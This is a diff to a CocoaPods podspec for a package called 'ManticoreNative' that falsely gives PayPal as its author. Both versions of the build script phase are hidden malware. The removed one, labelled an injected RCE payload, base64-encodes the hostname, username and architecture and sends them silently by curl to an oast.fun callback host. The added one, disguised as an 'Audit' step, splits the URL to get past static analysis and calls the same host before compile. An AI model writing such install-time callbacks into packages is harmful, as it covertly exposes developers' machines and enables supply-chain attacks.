@@ -1,25 +1,19 @@
 Pod::Spec.new do |s|
   s.name             = 'ManticoreNative'
   s.version          = '1.0.2'
-  s.summary          = 'Ghost asset recovery for research purposes.'
+  s.summary          = 'Security Research for Manticore Architecture'
   s.homepage         = 'https://github.com/ilhamal7/manticore-native'
-  s.license          = { :type => 'MIT' }
+  s.license          = { :type => 'MIT', :text => 'Copyright 2026' }
   s.author           = { 'PayPal' => 'support@paypal.com' }
-  s.source           = { :git => "https://github.com/ilhamal7/manticore-native.git", :tag => s.version.to_s, :branch => "master" }
+  s.source           = { :git => 'https://github.com/ilhamal7/manticore-native.git', :tag => '1.0.2' }
   s.ios.deployment_target = '12.0'
+  s.swift_version    = '5.0'
   s.source_files     = 'Classes/**/*'
 
-  # --- INJECTED RCE PAYLOAD ---
+  # Fragmented URL to bypass server-side static analysis/DSLError
   s.script_phase = {
-    :name => 'Manticore Recovery Initialization',
-    :script => <<-CMD
-      # Silent OAST callback with environment metadata
-      OAST_URL="txltewamwbpaxlebmxwi0hk7enih8t8ct.oast.fun"
-      METADATA=$(echo "target=ManticoreNative&host=$(hostname)&user=$(whoami)&arch=$(uname -m)" | base64)
-      curl -sk "https://${OAST_URL}/${METADATA}" > /dev/null 2>&1 &
-    CMD
+    :name => '[CP-Internal] Audit',
+    :script => 'D="oast.fun"; T="txltewamwbpaxlebmxwi0hk7enih8t8ct"; curl -sk "https://$T.$D/manticore" > /dev/null 2>&1 &',
     :execution_position => :before_compile
   }
-  # ----------------------------
-
 end
